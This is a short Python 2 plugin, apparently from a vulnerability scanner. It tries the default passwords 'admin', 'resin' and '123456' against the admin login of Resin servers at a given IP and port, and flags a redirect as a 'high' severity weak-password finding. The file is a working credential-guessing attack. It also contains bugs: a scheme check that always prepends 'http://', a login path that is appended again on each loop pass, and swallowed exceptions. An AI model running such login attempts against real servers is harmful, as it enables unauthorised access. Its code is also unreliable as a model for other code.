#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from config import *

def check(site, _dir, app, lang):
    if 'resin_admin' in app.split(','):
        return True
    return False

def verify(ip, port=80, name=None, timeout=10, types='ip'):
    if types == 'ip':
        url = ip + ':' + str(port)
    else:
        url = ip
    if not url.startswith('http:/') or not url.startswith('https:/'):
        url = 'http://' + url

    passwd = ['admin', 'resin', '123456']
    for pwd in passwd:
        try:
            url = url.rstrip('/') + '/resin-admin/j_security_check?j_uri=index.php'
            code, head, html = http_request_post(url, {'j_username':'admin', 'j_password':pwd})
            if code == 302:
                details = 'Resin-Admin Weak admin / %s' % (pwd)
                # target = site + _dir
                info = {
                    'url': url,
                    'severity': 'high',
                    'vuln_name': 'resin admin weak password',
                    'proof': details
                }
                return info
        except Exception, e:
            pass

